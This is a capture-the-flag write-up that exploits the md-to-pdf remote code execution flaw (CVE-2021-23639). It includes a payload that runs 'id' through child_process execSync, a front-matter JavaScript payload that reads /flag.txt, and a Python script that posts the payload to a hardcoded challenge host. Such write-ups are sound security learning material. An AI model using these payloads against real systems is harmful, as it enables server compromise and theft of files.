# Blinker Fluid

This turned out to be a really quick challenge. After downloading the code and googling for exploits on the NPM packages I
found that `md-to-pdf` was vulnerable to a [RCE exploit CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880). 
I tried a couple of versions of the `---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE` payload that's 
mentioned in different POCs, but I couldn't get it to work. Then I found this [github issue](https://github.com/simonhaenisch/md-to-pdf/issues/99#issuecomment-925583328)
that shows a different way of writing the exploit. 

This turned out to work 👇
```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt')}"; display: block }`,
}
---
```

## Pwn script

```python
import requests

host = "http://68.183.36.105:32615" # Host to attack
url = host + "/api/invoice/add"
payload = "---js\n{\n    css: `body::before { content: \"${require('fs').readFileSync('/flag.txt')}\"; display: block }`,\n}\n---" # Be very careful, a slight syntax error will cause the exploit to fail.
json = {"markdown_content": payload}

res1 = requests.post(url,json=json)

if res1.status_code != 200:
    print("Explpoit failed Status Code - ", res1.status_code)
else:
    print("Exploit worked, visit - " + host + " and view latest Invoice")
```
